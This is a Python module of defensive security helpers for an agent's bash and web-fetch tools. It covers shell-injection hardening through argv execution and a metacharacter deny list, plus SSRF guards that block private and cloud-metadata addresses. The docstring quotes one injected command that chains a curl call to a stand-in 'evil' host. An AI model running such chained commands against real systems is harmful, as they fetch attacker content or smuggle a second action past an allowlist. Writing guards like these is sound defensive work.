"""Security helpers shared by Zoe's agent tools.

Two concerns live here, both raised in the 2026-06-28 security audit
(``.polly/audit-findings.md``, security lane):

1. **Shell-injection hardening** for the Zoe Agent ``bash`` tool. The old code
   checked a prefix allowlist and then ran the *string* through
   ``create_subprocess_shell``, so ``echo ok; curl http://evil`` ran both
   halves. We now parse the command into an argv list with :func:`shlex.split`
   and the caller executes it with ``create_subprocess_exec`` — i.e. **no
   shell** — so ``;`` ``|`` ``&`` ``$()`` backticks and redirects can never
   chain a second command; they become inert literal arguments to the single
   allowlisted binary. As defence in depth we also *reject* those
   metacharacters outright for non-code-bearing commands.

2. **SSRF hardening** for outbound fetches. :func:`assert_public_url` blocks
   targets that resolve to private / loopback / link-local / reserved /
   multicast addresses (this includes the cloud metadata endpoint
   ``169.254.169.254``), for the web research + browser fetch tools.
   :func:`assert_panel_host` is the narrower policy for display-panel hosts: it
   permits LAN (private) panel addresses and an explicit operator allowlist,
   but still blocks loopback / link-local / metadata / public targets.

The module is intentionally **stdlib-only** (no ``httpx`` / ``cloakbrowser``
imports) so it loads in the slim CI environment and is cheap to unit-test.
"""

from __future__ import annotations

import ipaddress
import os
import shlex
import socket
from typing import Iterable, List
from urllib.parse import urlsplit


class CommandRejected(ValueError):
    """The bash command failed the allowlist / injection policy."""


class SSRFBlocked(ValueError):
    """An outbound target is disallowed by the SSRF policy."""


# ── Shell-injection guard ─────────────────────────────────────────────────────

# Characters that introduce shell command chaining / substitution / redirection.
# Present here only as a defence-in-depth *rejection* signal — the real safety
# guarantee is that callers exec the returned argv WITHOUT a shell.
_SHELL_METACHARS = frozenset(";&|`$<>\n\r")

# Prefixes whose tail is an opaque *code* argument that may legitimately contain
# metacharacters (e.g. ``python3 -c "import os; print(os.getcwd())"``). For
# these the code payload is exempt from the raw-metacharacter scan; argv
# execution (no shell) is what keeps them safe.
_CODE_BEARING_PREFIXES = ("python3 -c", "python -c")


def split_command(command: str) -> List[str]:
    """Parse a command line into an argv list.

    Raises :class:`CommandRejected` on unbalanced quotes or an empty command.
    """
    try:
        argv = shlex.split(command)
    except ValueError as exc:
        raise CommandRejected(f"could not parse command: {exc}") from exc
    if not argv:
        raise CommandRejected("empty command")
    return argv


def check_bash_command(command: str, allowed_prefixes: Iterable[str]) -> List[str]:
    """Validate ``command`` against the allowlist + injection policy.

    Returns the argv list to execute. Callers MUST run it via
    ``asyncio.create_subprocess_exec(*argv, ...)`` (no shell) so that any shell
    metacharacters that slipped through stay inert literal arguments.

    Raises :class:`CommandRejected` if the command is not allowlisted, cannot be
    parsed, or contains shell metacharacters in a non-code position.
    """
    cmd = command.strip()
    if not cmd:
        raise CommandRejected("empty command")

    allowed = tuple(allowed_prefixes)
    if not any(cmd.startswith(pfx) for pfx in allowed):
        raise CommandRejected(f"'{cmd[:40]}' is not in the allowed command list")

    argv = split_command(cmd)

    if any(cmd.startswith(pfx) for pfx in _CODE_BEARING_PREFIXES):
        # Layout: <python> <-c> <code> [extra...]. The code arg (index 2) may
        # legitimately contain metacharacters, so scan only the tokens AFTER it.
        scan_tokens = argv[3:]
    else:
        scan_tokens = argv

    for tok in scan_tokens:
        bad = _SHELL_METACHARS.intersection(tok)
        if bad:
            raise CommandRejected(
                "shell metacharacter(s) "
                f"{''.join(sorted(bad))!r} are not allowed (command chaining blocked)"
            )
    return argv


# ── SSRF guard ────────────────────────────────────────────────────────────────


def _normalize(ip: "ipaddress._BaseAddress") -> "ipaddress._BaseAddress":
    """Collapse IPv4-mapped IPv6 (``::ffff:127.0.0.1``) to its IPv4 form so the
    classification flags below see the real address."""
    if isinstance(ip, ipaddress.IPv6Address) and ip.ipv4_mapped is not None:
        return ip.ipv4_mapped
    return ip


def resolve_ips(host: str) -> List["ipaddress._BaseAddress"]:
    """Resolve ``host`` (IP literal or DNS name) to normalized IP objects.

    Returns an empty list if the host is empty or cannot be resolved.
    """
    h = (host or "").strip().strip("[]")
    if not h:
        return []
    try:
        return [_normalize(ipaddress.ip_address(h))]
    except ValueError:
        pass
    try:
        infos = socket.getaddrinfo(h, None, proto=socket.IPPROTO_TCP)
    except (socket.gaierror, UnicodeError, OSError):
        return []
    ips: List["ipaddress._BaseAddress"] = []
    for info in infos:
        try:
            ips.append(_normalize(ipaddress.ip_address(info[4][0])))
        except ValueError:
            continue
    return ips


def _is_dangerous_ip(ip: "ipaddress._BaseAddress") -> bool:
    """Loopback / link-local (incl. cloud metadata 169.254.169.254) / multicast /
    reserved / unspecified — never a valid outbound target for any policy."""
    return (
        ip.is_loopback
        or ip.is_link_local
        or ip.is_multicast
        or ip.is_reserved
        or ip.is_unspecified
    )


def is_public_ip(ip: "ipaddress._BaseAddress") -> bool:
    """True only for globally-routable public addresses."""
    ip = _normalize(ip)
    return ip.is_global and not _is_dangerous_ip(ip) and not ip.is_private


def assert_public_url(url: str) -> str:
    """SSRF gate for outbound *web* fetches (research + browser tools).

    Allows only ``http(s)`` URLs whose host resolves entirely to public,
    globally-routable addresses. Rejects private / loopback / link-local /
    metadata / reserved / multicast targets and unresolvable hosts.

    Returns the URL unchanged on success; raises :class:`SSRFBlocked` otherwise.
    """
    parts = urlsplit((url or "").strip())
    if parts.scheme not in ("http", "https"):
        raise SSRFBlocked(f"scheme {parts.scheme or '(none)'!r} not allowed (http/https only)")
    host = parts.hostname
    if not host:
        raise SSRFBlocked("URL has no host")
    ips = resolve_ips(host)
    if not ips:
        raise SSRFBlocked(f"host {host!r} could not be resolved")
    for ip in ips:
        if not is_public_ip(ip):
            raise SSRFBlocked(f"host {host!r} resolves to non-public address {ip}")
    return url


def is_public_url(url: str) -> bool:
    """Boolean form of :func:`assert_public_url` (no exception)."""
    try:
        assert_public_url(url)
        return True
    except SSRFBlocked:
        return False


def panel_allowlist() -> set:
    """Explicit panel-host allowlist.

    Always includes the configured default panel host (``ZOE_PI_HOST``) and any
    comma-separated extras in ``ZOE_PANEL_ALLOWED_HOSTS``. Use this to permit a
    co-located panel on loopback, which the LAN heuristic below would block.
    """
    hosts = {
        h.strip().lower()
        for h in os.environ.get("ZOE_PANEL_ALLOWED_HOSTS", "").split(",")
        if h.strip()
    }
    default = os.environ.get("ZOE_PI_HOST", "192.168.1.61").strip().lower()
    if default:
        hosts.add(default)
    return hosts


def is_allowed_panel_host(host: str) -> bool:
    """Policy for display-panel hosts.

    Allowed: hosts in :func:`panel_allowlist`, or any **private LAN** address
    (panels live on the LAN). Blocked: loopback, link-local / cloud-metadata,
    multicast, reserved, and **public** addresses (a panel host is never on the
    public internet — that would be an exfiltration target).
    """
    h = (host or "").strip()
    if not h:
        return False
    if h.lower() in panel_allowlist():
        return True
    ips = resolve_ips(h)
    if not ips:
        return False
    for ip in ips:
        if _is_dangerous_ip(ip):
            return False
        if ip.is_global:  # panels are LAN-only; a public target is never valid
            return False
        if not ip.is_private:
            return False
    return True


def assert_panel_host(host: str) -> str:
    """Raise :class:`SSRFBlocked` unless ``host`` is an allowed local panel target."""
    if not is_allowed_panel_host(host):
        raise SSRFBlocked(f"panel host {host!r} is not an allowed local panel target")
    return host


def guarded_urlopen(url: str, *, timeout: float, headers: dict | None = None):
    """``urllib`` open that enforces :func:`assert_public_url` on the initial URL
    **and on every redirect hop** (defends against redirect-to-internal SSRF).

    Returns the response object for the caller to read. Raises
    :class:`SSRFBlocked` if any hop targets a non-public address.
    """
    from urllib.request import (
        Request,
        HTTPRedirectHandler,
        build_opener,
    )

    assert_public_url(url)

    class _GuardedRedirect(HTTPRedirectHandler):
        def redirect_request(self, req, fp, code, msg, hdrs, newurl):
            assert_public_url(newurl)  # raises SSRFBlocked -> aborts the chain
            return super().redirect_request(req, fp, code, msg, hdrs, newurl)

    opener = build_opener(_GuardedRedirect)
    req = Request(url, headers=headers or {})
    return opener.open(req, timeout=timeout)
